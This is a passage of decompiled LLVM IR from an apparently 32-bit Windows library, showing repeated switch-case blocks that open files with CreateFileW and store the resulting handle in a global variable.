  %313 = add i32 %esp.3.reload, -20, !insn.addr !936
  %314 = inttoptr i32 %313 to i32*, !insn.addr !936
  store i32 1, i32* %314, align 4, !insn.addr !936
  %315 = add i32 %esp.3.reload, -24, !insn.addr !937
  %316 = inttoptr i32 %315 to i32*, !insn.addr !937
  store i32 4, i32* %316, align 4, !insn.addr !937
  %317 = add i32 %esp.3.reload, -28, !insn.addr !938
  %318 = inttoptr i32 %317 to i32*, !insn.addr !938
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %318, align 4, !insn.addr !938
  %319 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !939
  %320 = ptrtoint i32* %319 to i32, !insn.addr !939
  %321 = add i32 %esp.3.reload, -32, !insn.addr !940
  %322 = inttoptr i32 %321 to i32*, !insn.addr !940
  store i32 0, i32* %322, align 4, !insn.addr !940
  %323 = add i32 %esp.3.reload, -36, !insn.addr !941
  %324 = inttoptr i32 %323 to i32*, !insn.addr !941
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %324, align 4, !insn.addr !941
  %325 = add i32 %esp.3.reload, -40, !insn.addr !942
  %326 = inttoptr i32 %325 to i32*, !insn.addr !942
  store i32 2, i32* %326, align 4, !insn.addr !942
  %327 = add i32 %esp.3.reload, -44, !insn.addr !943
  %328 = inttoptr i32 %327 to i32*, !insn.addr !943
  store i32 ptrtoint (i32* @global_var_1003925c to i32), i32* %328, align 4, !insn.addr !943
  store i32 %320, i32* @global_var_1003d9b0, align 4, !insn.addr !944
  %329 = add i32 %esp.3.reload, -48, !insn.addr !945
  %330 = inttoptr i32 %329 to i32*, !insn.addr !945
  store i32 %320, i32* %330, align 4, !insn.addr !945
  store i32 %329, i32* %esp.5.reg2mem, !insn.addr !946
  br label %dec_label_pc_10002dc5, !insn.addr !946

dec_label_pc_10002843:                            ; preds = %dec_label_pc_100025b4
  %331 = call i32 @function_10001ff0(), !insn.addr !947
  store i32 185, i32* %.pre-phi.reg2mem, !insn.addr !948
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !948
  br label %dec_label_pc_10002dcf, !insn.addr !948

dec_label_pc_10002852:                            ; preds = %dec_label_pc_100025b4, %dec_label_pc_100025b4
  %332 = add i32 %esp.3.reload, -4, !insn.addr !949
  %333 = inttoptr i32 %332 to i32*, !insn.addr !949
  store i32 0, i32* %333, align 4, !insn.addr !949
  %334 = add i32 %esp.3.reload, -8, !insn.addr !950
  %335 = inttoptr i32 %334 to i32*, !insn.addr !950
  store i32 128, i32* %335, align 4, !insn.addr !950
  %336 = add i32 %esp.3.reload, -12, !insn.addr !951
  %337 = inttoptr i32 %336 to i32*, !insn.addr !951
  store i32 4, i32* %337, align 4, !insn.addr !951
  %338 = add i32 %esp.3.reload, -16, !insn.addr !952
  %339 = inttoptr i32 %338 to i32*, !insn.addr !952
  store i32 0, i32* %339, align 4, !insn.addr !952
  %340 = add i32 %esp.3.reload, -20, !insn.addr !953
  %341 = inttoptr i32 %340 to i32*, !insn.addr !953
  store i32 1, i32* %341, align 4, !insn.addr !953
  %342 = add i32 %esp.3.reload, -24, !insn.addr !954
  %343 = inttoptr i32 %342 to i32*, !insn.addr !954
  store i32 4, i32* %343, align 4, !insn.addr !954
  %344 = add i32 %esp.3.reload, -28, !insn.addr !955
  %345 = inttoptr i32 %344 to i32*, !insn.addr !955
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %345, align 4, !insn.addr !955
  %346 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !956
  %347 = ptrtoint i32* %346 to i32, !insn.addr !956
  %348 = add i32 %esp.3.reload, -32, !insn.addr !957
  %349 = inttoptr i32 %348 to i32*, !insn.addr !957
  store i32 0, i32* %349, align 4, !insn.addr !957
  %350 = add i32 %esp.3.reload, -36, !insn.addr !958
  %351 = inttoptr i32 %350 to i32*, !insn.addr !958
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %351, align 4, !insn.addr !958
  %352 = add i32 %esp.3.reload, -40, !insn.addr !959
  %353 = inttoptr i32 %352 to i32*, !insn.addr !959
  store i32 2, i32* %353, align 4, !insn.addr !959
  %354 = add i32 %esp.3.reload, -44, !insn.addr !960
  %355 = inttoptr i32 %354 to i32*, !insn.addr !960
  store i32 ptrtoint (i32* @global_var_10039260 to i32), i32* %355, align 4, !insn.addr !960
  store i32 %347, i32* @global_var_1003d9b0, align 4, !insn.addr !961
  %356 = add i32 %esp.3.reload, -48, !insn.addr !962
  %357 = inttoptr i32 %356 to i32*, !insn.addr !962
  store i32 %347, i32* %357, align 4, !insn.addr !962
  store i32 %356, i32* %esp.5.reg2mem, !insn.addr !963
  br label %dec_label_pc_10002dc5, !insn.addr !963

dec_label_pc_10002881:                            ; preds = %dec_label_pc_100025b4
  %358 = call i32 @function_10001ff0(), !insn.addr !964
  store i32 187, i32* %.pre-phi.reg2mem, !insn.addr !965
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !965
  br label %dec_label_pc_10002dcf, !insn.addr !965

dec_label_pc_10002890:                            ; preds = %dec_label_pc_100025b4
  %359 = add i32 %esp.3.reload, -4, !insn.addr !966
  %360 = inttoptr i32 %359 to i32*, !insn.addr !966
  store i32 0, i32* %360, align 4, !insn.addr !966
  %361 = add i32 %esp.3.reload, -8, !insn.addr !967
  %362 = inttoptr i32 %361 to i32*, !insn.addr !967
  store i32 128, i32* %362, align 4, !insn.addr !967
  %363 = add i32 %esp.3.reload, -12, !insn.addr !968
  %364 = inttoptr i32 %363 to i32*, !insn.addr !968
  store i32 4, i32* %364, align 4, !insn.addr !968
  %365 = add i32 %esp.3.reload, -16, !insn.addr !969
  %366 = inttoptr i32 %365 to i32*, !insn.addr !969
  store i32 0, i32* %366, align 4, !insn.addr !969
  %367 = add i32 %esp.3.reload, -20, !insn.addr !970
  %368 = inttoptr i32 %367 to i32*, !insn.addr !970
  store i32 1, i32* %368, align 4, !insn.addr !970
  %369 = add i32 %esp.3.reload, -24, !insn.addr !971
  %370 = inttoptr i32 %369 to i32*, !insn.addr !971
  store i32 4, i32* %370, align 4, !insn.addr !971
  %371 = add i32 %esp.3.reload, -28, !insn.addr !972
  %372 = inttoptr i32 %371 to i32*, !insn.addr !972
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %372, align 4, !insn.addr !972
  %373 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !973
  %374 = ptrtoint i32* %373 to i32, !insn.addr !973
  %375 = add i32 %esp.3.reload, -32, !insn.addr !974
  %376 = inttoptr i32 %375 to i32*, !insn.addr !974
  store i32 0, i32* %376, align 4, !insn.addr !974
  %377 = add i32 %esp.3.reload, -36, !insn.addr !975
  %378 = inttoptr i32 %377 to i32*, !insn.addr !975
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %378, align 4, !insn.addr !975
  %379 = add i32 %esp.3.reload, -40, !insn.addr !976
  %380 = inttoptr i32 %379 to i32*, !insn.addr !976
  store i32 2, i32* %380, align 4, !insn.addr !976
  %381 = add i32 %esp.3.reload, -44, !insn.addr !977
  %382 = inttoptr i32 %381 to i32*, !insn.addr !977
  store i32 ptrtoint (i32* @global_var_10039264 to i32), i32* %382, align 4, !insn.addr !977
  store i32 %374, i32* @global_var_1003d9b0, align 4, !insn.addr !978
  %383 = add i32 %esp.3.reload, -48, !insn.addr !979
  %384 = inttoptr i32 %383 to i32*, !insn.addr !979
  store i32 %374, i32* %384, align 4, !insn.addr !979
  store i32 %383, i32* %esp.5.reg2mem, !insn.addr !980
  br label %dec_label_pc_10002dc5, !insn.addr !980

dec_label_pc_100028bf:                            ; preds = %dec_label_pc_100025b4
  %385 = add i32 %esp.3.reload, -4, !insn.addr !981
  %386 = inttoptr i32 %385 to i32*, !insn.addr !981
  store i32 0, i32* %386, align 4, !insn.addr !981
  %387 = add i32 %esp.3.reload, -8, !insn.addr !982
  %388 = inttoptr i32 %387 to i32*, !insn.addr !982
  store i32 128, i32* %388, align 4, !insn.addr !982
  %389 = add i32 %esp.3.reload, -12, !insn.addr !983
  %390 = inttoptr i32 %389 to i32*, !insn.addr !983
  store i32 4, i32* %390, align 4, !insn.addr !983
  %391 = add i32 %esp.3.reload, -16, !insn.addr !984
  %392 = inttoptr i32 %391 to i32*, !insn.addr !984
  store i32 0, i32* %392, align 4, !insn.addr !984
  %393 = add i32 %esp.3.reload, -20, !insn.addr !985
  %394 = inttoptr i32 %393 to i32*, !insn.addr !985
  store i32 1, i32* %394, align 4, !insn.addr !985
  %395 = add i32 %esp.3.reload, -24, !insn.addr !986
  %396 = inttoptr i32 %395 to i32*, !insn.addr !986
  store i32 4, i32* %396, align 4, !insn.addr !986
  %397 = add i32 %esp.3.reload, -28, !insn.addr !987
  %398 = inttoptr i32 %397 to i32*, !insn.addr !987
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %398, align 4, !insn.addr !987
  %399 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !988
  %400 = ptrtoint i32* %399 to i32, !insn.addr !988
  %401 = add i32 %esp.3.reload, -32, !insn.addr !989
  %402 = inttoptr i32 %401 to i32*, !insn.addr !989
  store i32 0, i32* %402, align 4, !insn.addr !989
  %403 = add i32 %esp.3.reload, -36, !insn.addr !990
  %404 = inttoptr i32 %403 to i32*, !insn.addr !990
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %404, align 4, !insn.addr !990
  %405 = add i32 %esp.3.reload, -40, !insn.addr !991
  %406 = inttoptr i32 %405 to i32*, !insn.addr !991
  store i32 2, i32* %406, align 4, !insn.addr !991
  %407 = add i32 %esp.3.reload, -44, !insn.addr !992
  %408 = inttoptr i32 %407 to i32*, !insn.addr !992
  store i32 ptrtoint (i32* @global_var_10039268 to i32), i32* %408, align 4, !insn.addr !992
  store i32 %400, i32* @global_var_1003d9b0, align 4, !insn.addr !993
  %409 = add i32 %esp.3.reload, -48, !insn.addr !994
  %410 = inttoptr i32 %409 to i32*, !insn.addr !994
  store i32 %400, i32* %410, align 4, !insn.addr !994
  store i32 %409, i32* %esp.5.reg2mem, !insn.addr !995
  br label %dec_label_pc_10002dc5, !insn.addr !995

dec_label_pc_100028ee:                            ; preds = %dec_label_pc_100025b4, %dec_label_pc_100025b4, %dec_label_pc_100025b4
  %411 = add i32 %esp.3.reload, -4, !insn.addr !996
  %412 = inttoptr i32 %411 to i32*, !insn.addr !996
  store i32 0, i32* %412, align 4, !insn.addr !996
  %413 = add i32 %esp.3.reload, -8, !insn.addr !997
  %414 = inttoptr i32 %413 to i32*, !insn.addr !997
  store i32 128, i32* %414, align 4, !insn.addr !997
  %415 = add i32 %esp.3.reload, -12, !insn.addr !998
  %416 = inttoptr i32 %415 to i32*, !insn.addr !998
  store i32 4, i32* %416, align 4, !insn.addr !998
  %417 = add i32 %esp.3.reload, -16, !insn.addr !999
  %418 = inttoptr i32 %417 to i32*, !insn.addr !999
  store i32 0, i32* %418, align 4, !insn.addr !999
  %419 = add i32 %esp.3.reload, -20, !insn.addr !1000
  %420 = inttoptr i32 %419 to i32*, !insn.addr !1000
  store i32 1, i32* %420, align 4, !insn.addr !1000
  %421 = add i32 %esp.3.reload, -24, !insn.addr !1001
  %422 = inttoptr i32 %421 to i32*, !insn.addr !1001
  store i32 4, i32* %422, align 4, !insn.addr !1001
  %423 = add i32 %esp.3.reload, -28, !insn.addr !1002
  %424 = inttoptr i32 %423 to i32*, !insn.addr !1002
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %424, align 4, !insn.addr !1002
  %425 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1003
  %426 = ptrtoint i32* %425 to i32, !insn.addr !1003
  %427 = add i32 %esp.3.reload, -32, !insn.addr !1004
  %428 = inttoptr i32 %427 to i32*, !insn.addr !1004
  store i32 0, i32* %428, align 4, !insn.addr !1004
  %429 = add i32 %esp.3.reload, -36, !insn.addr !1005
  %430 = inttoptr i32 %429 to i32*, !insn.addr !1005
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %430, align 4, !insn.addr !1005
  %431 = add i32 %esp.3.reload, -40, !insn.addr !1006
  %432 = inttoptr i32 %431 to i32*, !insn.addr !1006
  store i32 2, i32* %432, align 4, !insn.addr !1006
  %433 = add i32 %esp.3.reload, -44, !insn.addr !1007
  %434 = inttoptr i32 %433 to i32*, !insn.addr !1007
  store i32 ptrtoint (i32* @global_var_1003926c to i32), i32* %434, align 4, !insn.addr !1007
  store i32 %426, i32* @global_var_1003d9b0, align 4, !insn.addr !1008
  %435 = add i32 %esp.3.reload, -48, !insn.addr !1009
  %436 = inttoptr i32 %435 to i32*, !insn.addr !1009
  store i32 %426, i32* %436, align 4, !insn.addr !1009
  store i32 %435, i32* %esp.5.reg2mem, !insn.addr !1010
  br label %dec_label_pc_10002dc5, !insn.addr !1010

dec_label_pc_1000291d:                            ; preds = %dec_label_pc_100025b4
  %437 = add i32 %esp.3.reload, -4, !insn.addr !1011
  %438 = inttoptr i32 %437 to i32*, !insn.addr !1011
  store i32 0, i32* %438, align 4, !insn.addr !1011
  %439 = add i32 %esp.3.reload, -8, !insn.addr !1012
  %440 = inttoptr i32 %439 to i32*, !insn.addr !1012
  store i32 128, i32* %440, align 4, !insn.addr !1012
  %441 = add i32 %esp.3.reload, -12, !insn.addr !1013
  %442 = inttoptr i32 %441 to i32*, !insn.addr !1013
  store i32 4, i32* %442, align 4, !insn.addr !1013
  %443 = add i32 %esp.3.reload, -16, !insn.addr !1014
  %444 = inttoptr i32 %443 to i32*, !insn.addr !1014
  store i32 0, i32* %444, align 4, !insn.addr !1014
  %445 = add i32 %esp.3.reload, -20, !insn.addr !1015
  %446 = inttoptr i32 %445 to i32*, !insn.addr !1015
  store i32 1, i32* %446, align 4, !insn.addr !1015
  %447 = add i32 %esp.3.reload, -24, !insn.addr !1016
  %448 = inttoptr i32 %447 to i32*, !insn.addr !1016
  store i32 4, i32* %448, align 4, !insn.addr !1016
  %449 = add i32 %esp.3.reload, -28, !insn.addr !1017
  %450 = inttoptr i32 %449 to i32*, !insn.addr !1017
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %450, align 4, !insn.addr !1017
  %451 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1018
  %452 = ptrtoint i32* %451 to i32, !insn.addr !1018
  %453 = add i32 %esp.3.reload, -32, !insn.addr !1019
  %454 = inttoptr i32 %453 to i32*, !insn.addr !1019
  store i32 0, i32* %454, align 4, !insn.addr !1019
  %455 = add i32 %esp.3.reload, -36, !insn.addr !1020
  %456 = inttoptr i32 %455 to i32*, !insn.addr !1020
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %456, align 4, !insn.addr !1020
  %457 = add i32 %esp.3.reload, -40, !insn.addr !1021
  %458 = inttoptr i32 %457 to i32*, !insn.addr !1021
  store i32 2, i32* %458, align 4, !insn.addr !1021
  %459 = add i32 %esp.3.reload, -44, !insn.addr !1022
  %460 = inttoptr i32 %459 to i32*, !insn.addr !1022
  store i32 ptrtoint (i32* @global_var_10039270 to i32), i32* %460, align 4, !insn.addr !1022
  store i32 %452, i32* @global_var_1003d9b0, align 4, !insn.addr !1023
  %461 = add i32 %esp.3.reload, -48, !insn.addr !1024
  %462 = inttoptr i32 %461 to i32*, !insn.addr !1024
  store i32 %452, i32* %462, align 4, !insn.addr !1024
  store i32 %461, i32* %esp.5.reg2mem, !insn.addr !1025
  br label %dec_label_pc_10002dc5, !insn.addr !1025

dec_label_pc_1000294c:                            ; preds = %dec_label_pc_100025b4
  %463 = add i32 %esp.3.reload, -4, !insn.addr !1026
  %464 = inttoptr i32 %463 to i32*, !insn.addr !1026
  store i32 0, i32* %464, align 4, !insn.addr !1026
  %465 = add i32 %esp.3.reload, -8, !insn.addr !1027
  %466 = inttoptr i32 %465 to i32*, !insn.addr !1027
  store i32 128, i32* %466, align 4, !insn.addr !1027
  %467 = add i32 %esp.3.reload, -12, !insn.addr !1028
  %468 = inttoptr i32 %467 to i32*, !insn.addr !1028
  store i32 4, i32* %468, align 4, !insn.addr !1028
  %469 = add i32 %esp.3.reload, -16, !insn.addr !1029
  %470 = inttoptr i32 %469 to i32*, !insn.addr !1029
  store i32 0, i32* %470, align 4, !insn.addr !1029
  %471 = add i32 %esp.3.reload, -20, !insn.addr !1030
  %472 = inttoptr i32 %471 to i32*, !insn.addr !1030
  store i32 1, i32* %472, align 4, !insn.addr !1030
  %473 = add i32 %esp.3.reload, -24, !insn.addr !1031
  %474 = inttoptr i32 %473 to i32*, !insn.addr !1031
  store i32 4, i32* %474, align 4, !insn.addr !1031
  %475 = add i32 %esp.3.reload, -28, !insn.addr !1032
  %476 = inttoptr i32 %475 to i32*, !insn.addr !1032
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %476, align 4, !insn.addr !1032
  %477 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1033
  %478 = ptrtoint i32* %477 to i32, !insn.addr !1033
  %479 = add i32 %esp.3.reload, -32, !insn.addr !1034
  %480 = inttoptr i32 %479 to i32*, !insn.addr !1034
  store i32 0, i32* %480, align 4, !insn.addr !1034
  %481 = add i32 %esp.3.reload, -36, !insn.addr !1035
  %482 = inttoptr i32 %481 to i32*, !insn.addr !1035
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %482, align 4, !insn.addr !1035
  %483 = add i32 %esp.3.reload, -40, !insn.addr !1036
  %484 = inttoptr i32 %483 to i32*, !insn.addr !1036
  store i32 2, i32* %484, align 4, !insn.addr !1036
  %485 = add i32 %esp.3.reload, -44, !insn.addr !1037
  %486 = inttoptr i32 %485 to i32*, !insn.addr !1037
  store i32 ptrtoint (i32* @global_var_10039274 to i32), i32* %486, align 4, !insn.addr !1037
  store i32 %478, i32* @global_var_1003d9b0, align 4, !insn.addr !1038
  %487 = add i32 %esp.3.reload, -48, !insn.addr !1039
  %488 = inttoptr i32 %487 to i32*, !insn.addr !1039
  store i32 %478, i32* %488, align 4, !insn.addr !1039
  store i32 %487, i32* %esp.5.reg2mem, !insn.addr !1040
  br label %dec_label_pc_10002dc5, !insn.addr !1040

dec_label_pc_1000297b:                            ; preds = %dec_label_pc_100025b4
  %489 = add i32 %esp.3.reload, -4, !insn.addr !1041
  %490 = inttoptr i32 %489 to i32*, !insn.addr !1041
  store i32 0, i32* %490, align 4, !insn.addr !1041
  %491 = add i32 %esp.3.reload, -8, !insn.addr !1042
  %492 = inttoptr i32 %491 to i32*, !insn.addr !1042
  store i32 128, i32* %492, align 4, !insn.addr !1042
  %493 = add i32 %esp.3.reload, -12, !insn.addr !1043
  %494 = inttoptr i32 %493 to i32*, !insn.addr !1043
  store i32 4, i32* %494, align 4, !insn.addr !1043
  %495 = add i32 %esp.3.reload, -16, !insn.addr !1044
  %496 = inttoptr i32 %495 to i32*, !insn.addr !1044
  store i32 0, i32* %496, align 4, !insn.addr !1044
  %497 = add i32 %esp.3.reload, -20, !insn.addr !1045
  %498 = inttoptr i32 %497 to i32*, !insn.addr !1045
  store i32 1, i32* %498, align 4, !insn.addr !1045
  %499 = add i32 %esp.3.reload, -24, !insn.addr !1046
  %500 = inttoptr i32 %499 to i32*, !insn.addr !1046
  store i32 4, i32* %500, align 4, !insn.addr !1046
  %501 = add i32 %esp.3.reload, -28, !insn.addr !1047
  %502 = inttoptr i32 %501 to i32*, !insn.addr !1047
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %502, align 4, !insn.addr !1047
  %503 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1048
  %504 = ptrtoint i32* %503 to i32, !insn.addr !1048
  %505 = add i32 %esp.3.reload, -32, !insn.addr !1049
  %506 = inttoptr i32 %505 to i32*, !insn.addr !1049
  store i32 0, i32* %506, align 4, !insn.addr !1049
  %507 = add i32 %esp.3.reload, -36, !insn.addr !1050
  %508 = inttoptr i32 %507 to i32*, !insn.addr !1050
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %508, align 4, !insn.addr !1050
  %509 = add i32 %esp.3.reload, -40, !insn.addr !1051
  %510 = inttoptr i32 %509 to i32*, !insn.addr !1051
  store i32 2, i32* %510, align 4, !insn.addr !1051
  %511 = add i32 %esp.3.reload, -44, !insn.addr !1052
  %512 = inttoptr i32 %511 to i32*, !insn.addr !1052
  store i32 ptrtoint (i32* @global_var_10039278 to i32), i32* %512, align 4, !insn.addr !1052
  store i32 %504, i32* @global_var_1003d9b0, align 4, !insn.addr !1053
  %513 = add i32 %esp.3.reload, -48, !insn.addr !1054
  %514 = inttoptr i32 %513 to i32*, !insn.addr !1054
  store i32 %504, i32* %514, align 4, !insn.addr !1054
  store i32 %513, i32* %esp.5.reg2mem, !insn.addr !1055
  br label %dec_label_pc_10002dc5, !insn.addr !1055

dec_label_pc_100029aa:                            ; preds = %dec_label_pc_100025b4
  %515 = add i32 %esp.3.reload, -4, !insn.addr !1056
  %516 = inttoptr i32 %515 to i32*, !insn.addr !1056
  store i32 0, i32* %516, align 4, !insn.addr !1056
  %517 = add i32 %esp.3.reload, -8, !insn.addr !1057
  %518 = inttoptr i32 %517 to i32*, !insn.addr !1057
  store i32 128, i32* %518, align 4, !insn.addr !1057
  %519 = add i32 %esp.3.reload, -12, !insn.addr !1058
  %520 = inttoptr i32 %519 to i32*, !insn.addr !1058
  store i32 4, i32* %520, align 4, !insn.addr !1058
  %521 = add i32 %esp.3.reload, -16, !insn.addr !1059
  %522 = inttoptr i32 %521 to i32*, !insn.addr !1059
  store i32 0, i32* %522, align 4, !insn.addr !1059
  %523 = add i32 %esp.3.reload, -20, !insn.addr !1060
  %524 = inttoptr i32 %523 to i32*, !insn.addr !1060
  store i32 1, i32* %524, align 4, !insn.addr !1060
  %525 = add i32 %esp.3.reload, -24, !insn.addr !1061
  %526 = inttoptr i32 %525 to i32*, !insn.addr !1061
  store i32 4, i32* %526, align 4, !insn.addr !1061
  %527 = add i32 %esp.3.reload, -28, !insn.addr !1062
  %528 = inttoptr i32 %527 to i32*, !insn.addr !1062
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %528, align 4, !insn.addr !1062
  %529 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1063
  %530 = ptrtoint i32* %529 to i32, !insn.addr !1063
  %531 = add i32 %esp.3.reload, -32, !insn.addr !1064
  %532 = inttoptr i32 %531 to i32*, !insn.addr !1064
  store i32 0, i32* %532, align 4, !insn.addr !1064
  %533 = add i32 %esp.3.reload, -36, !insn.addr !1065
  %534 = inttoptr i32 %533 to i32*, !insn.addr !1065
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %534, align 4, !insn.addr !1065
  %535 = add i32 %esp.3.reload, -40, !insn.addr !1066
  %536 = inttoptr i32 %535 to i32*, !insn.addr !1066
  store i32 2, i32* %536, align 4, !insn.addr !1066
  %537 = add i32 %esp.3.reload, -44, !insn.addr !1067
  %538 = inttoptr i32 %537 to i32*, !insn.addr !1067
  store i32 ptrtoint (i32* @global_var_1003927c to i32), i32* %538, align 4, !insn.addr !1067
  store i32 %530, i32* @global_var_1003d9b0, align 4, !insn.addr !1068
  %539 = add i32 %esp.3.reload, -48, !insn.addr !1069
  %540 = inttoptr i32 %539 to i32*, !insn.addr !1069
  store i32 %530, i32* %540, align 4, !insn.addr !1069
  store i32 %539, i32* %esp.5.reg2mem, !insn.addr !1070
  br label %dec_label_pc_10002dc5, !insn.addr !1070

dec_label_pc_100029d9:                            ; preds = %dec_label_pc_100025b4
  %541 = add i32 %esp.3.reload, -4, !insn.addr !1071
  %542 = inttoptr i32 %541 to i32*, !insn.addr !1071
  store i32 0, i32* %542, align 4, !insn.addr !1071
  %543 = add i32 %esp.3.reload, -8, !insn.addr !1072
  %544 = inttoptr i32 %543 to i32*, !insn.addr !1072
  store i32 128, i32* %544, align 4, !insn.addr !1072
  %545 = add i32 %esp.3.reload, -12, !insn.addr !1073
  %546 = inttoptr i32 %545 to i32*, !insn.addr !1073
  store i32 4, i32* %546, align 4, !insn.addr !1073
  %547 = add i32 %esp.3.reload, -16, !insn.addr !1074
  %548 = inttoptr i32 %547 to i32*, !insn.addr !1074
  store i32 0, i32* %548, align 4, !insn.addr !1074
  %549 = add i32 %esp.3.reload, -20, !insn.addr !1075
  %550 = inttoptr i32 %549 to i32*, !insn.addr !1075
  store i32 1, i32* %550, align 4, !insn.addr !1075
  %551 = add i32 %esp.3.reload, -24, !insn.addr !1076
  %552 = inttoptr i32 %551 to i32*, !insn.addr !1076
  store i32 4, i32* %552, align 4, !insn.addr !1076
  %553 = add i32 %esp.3.reload, -28, !insn.addr !1077
  %554 = inttoptr i32 %553 to i32*, !insn.addr !1077
  store i32 ptrtoint (i16** @global_var_1003fd10 to i32), i32* %554, align 4, !insn.addr !1077
  %555 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @1 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), i32* nonnull @1), !insn.addr !1078
  %556 = ptrtoint i32* %555 to i32, !insn.addr !1078
  %557 = add i32 %esp.3.reload, -32, !insn.addr !1079
  %558 = inttoptr i32 %557 to i32*, !insn.addr !1079
  store i32 0, i32* %558, align 4, !insn.addr !1079
  %559 = add i32 %esp.3.reload, -36, !insn.addr !1080
  %560 = inttoptr i32 %559 to i32*, !insn.addr !1080
  store i32 ptrtoint (i32* @global_var_10040020 to i32), i32* %560, align 4, !insn.addr !1080
  %561 = add i32 %esp.3.reload, -40, !insn.addr !1081
  %562 = inttoptr i32 %561 to i32*, !insn.addr !1081
  store i32 2, i32* %562, align 4, !insn.addr !1081
  %563 = add i32 %esp.3.reload, -44, !insn.addr !1082
  %564 = inttoptr i32 %563 to i32*, !insn.addr !1082
  store i32 ptrtoint (i32* @global_var_10039280 to i32), i32* %564, align 4, !insn.addr !1082
  store i32 %556, i32* @global_var_1003d9b0, align 4, !insn.addr !1083
  %565 = add i32 %esp.3.reload, -48, !insn.addr !1084
  %566 = inttoptr i32 %565 to i32*, !insn.addr !1084
  store i32 %556, i32* %566, align 4, !insn.addr !1084
  store i32 %565, i32* %esp.5.reg2mem, !insn.addr !1085
  br label %dec_label_pc_10002dc5, !insn.addr !1085

dec_label_pc_10002a08:                            ; preds = %dec_label_pc_100025b4
  %567 = add i32 %esp.3.reload, -4, !insn.addr !1086
  %568 = inttoptr i32 %567 to i32*, !insn.addr !1086
  store i32 0, i32* %568, align 4, !insn.addr !1086
  %569 = add i32 %esp.3.reload, -8, !insn.addr !1087
  %570 = inttoptr i32 %569 to i32*, !insn.addr !1087
  store i32 128, i32* %570, align 4, !insn.addr !1087
  %571 = add i32 %esp.3.reload, -12, !insn.addr !1088
  %572 = inttoptr i32 %571 to i32*, !insn.addr !1088
  store i32 4, i32* %572, align 4, !insn.addr !1088
  %573 = add i32 %esp.3.reload, -16, !insn.addr !1089
  %574 = inttoptr i32 %573 to i32*, !insn.addr !1089
  store i32 0, i32* %574, align 4, !insn.addr !1089
